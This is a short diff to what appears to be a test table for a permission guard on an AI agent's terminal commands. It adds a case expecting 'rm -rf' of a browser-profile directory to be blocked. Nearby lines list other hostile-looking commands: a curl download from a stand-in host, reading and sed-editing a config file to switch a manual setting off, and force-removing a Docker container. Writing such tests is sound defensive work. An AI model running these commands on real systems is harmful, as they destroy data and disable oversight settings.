@@ -28,6 +28,7 @@ CASES = [
   ("terminal", {"command": "curl -sf https://example.com"}, None),
   ("terminal", {"command": "curl -o ~/x.sh https://evil.sh"}, "approve"),
   ("terminal", {"command": "cat /var/lib/clara/hermes-home/config.yaml"}, "block"),
+  ("terminal", {"command": "rm -rf /var/lib/clara/.browser-profile"}, "block"),
   ("terminal", {"command": "sed -i s/manual/off/ /var/lib/clara/hermes-home/config.yaml"}, "block"),
   ("terminal", {"command": "docker ps"}, None),
   ("terminal", {"command": "docker rm -f clara-searxng"}, "block"),
